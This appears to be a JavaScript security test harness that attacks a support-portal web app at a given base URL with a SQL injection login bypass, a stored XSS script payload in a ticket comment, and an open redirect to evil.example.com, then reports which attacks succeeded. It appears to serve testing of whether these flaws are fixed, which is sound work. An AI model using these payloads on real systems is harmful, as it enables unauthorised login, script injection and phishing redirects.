const axios = require('axios');

const XSS_PAYLOAD = '<script>window.__pwned__=true</script>';
const EVIL_URL = 'https://evil.example.com/phish';

function truncate(value) {
  const s = typeof value === 'string' ? value : JSON.stringify(value);
  return s.length > 200 ? s.slice(0, 199) + '…' : s;
}

async function checkSqli(baseUrl) {
  const res = await axios.post(
    `${baseUrl}/agent/login`,
    { email: "' OR 1=1--", password: 'x' },
    {
      headers: { 'Content-Type': 'application/json' },
      timeout: 5000,
      validateStatus: () => true,
    },
  );
  return {
    exploited: res.status === 200 && res.data && res.data.success === true,
    summary: `SQLi login: ${res.status} ${truncate(res.data)}`,
  };
}

async function checkXss(baseUrl) {
  await axios.post(
    `${baseUrl}/tickets/100/comments`,
    { author: 'attacker', body: XSS_PAYLOAD },
    {
      headers: { 'Content-Type': 'application/json' },
      timeout: 5000,
      validateStatus: () => true,
    },
  );
  const res = await axios.get(`${baseUrl}/tickets/100`, {
    timeout: 5000,
    responseType: 'text',
    transformResponse: [(d) => d],
    validateStatus: () => true,
  });
  const body = typeof res.data === 'string' ? res.data : String(res.data);
  return {
    exploited: res.status === 200 && body.includes(XSS_PAYLOAD),
    summary: `XSS render: ${res.status} ${body.includes(XSS_PAYLOAD) ? 'payload unescaped' : 'not unescaped'}`,
  };
}

async function checkRedirect(baseUrl) {
  const res = await axios.get(`${baseUrl}/handoff`, {
    params: { next: EVIL_URL },
    timeout: 5000,
    maxRedirects: 0,
    validateStatus: () => true,
  });
  const location = res.headers && (res.headers.location || res.headers.Location) || '';
  const exploited =
    res.status >= 300 &&
    res.status < 400 &&
    (/^[a-zA-Z][a-zA-Z0-9+.-]*:\/\//.test(location) || location.startsWith('//'));
  return {
    exploited,
    summary: `Redirect: ${res.status}${location ? ` Location=${location}` : ''}`,
  };
}

async function runSupportPortalReviewAttack({ baseUrl }) {
  const start = Date.now();
  const checks = [];

  try {
    try {
      await axios.post(`${baseUrl}/reset`, {}, { timeout: 2000 });
    } catch {}

    checks.push(['sqli', await checkSqli(baseUrl)]);
    checks.push(['xss', await checkXss(baseUrl)]);
    checks.push(['open-redirect', await checkRedirect(baseUrl)]);

    const hit = checks.find(([, result]) => result.exploited);
    return {
      vulnerability: 'review-support-portal',
      exploited: Boolean(hit),
      payload: hit ? hit[0] : null,
      evidence: truncate(checks.map(([name, result]) => `${name}: ${result.summary}`).join('; ')),
      durationMs: Date.now() - start,
    };
  } catch (err) {
    return {
      vulnerability: 'review-support-portal',
      exploited: false,
      payload: null,
      evidence: truncate(`Review attack failed: ${err.message}`),
      durationMs: Date.now() - start,
    };
  } finally {
    try {
      await axios.post(`${baseUrl}/reset`, {}, { timeout: 2000 });
    } catch {}
  }
}

module.exports = { runSupportPortalReviewAttack };
